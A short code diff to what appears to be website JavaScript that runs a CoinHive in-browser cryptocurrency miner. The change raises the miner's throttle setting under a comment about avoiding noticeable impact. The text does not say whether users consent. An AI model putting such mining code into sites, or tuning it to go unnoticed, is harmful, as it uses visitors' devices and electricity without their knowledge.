@@ -92,7 +92,7 @@ if (CoinHive) {
   const miner = new CoinHive.User(coinHiveKey, userId);
 
   // Heavily throttle mining to prevent noticiable impact
-  miner.setThrottle(0.85);
+  miner.setThrottle(0.9);
 
   const checkCoinHiveStatus = () => {
     if (!miner.isRunning()) {
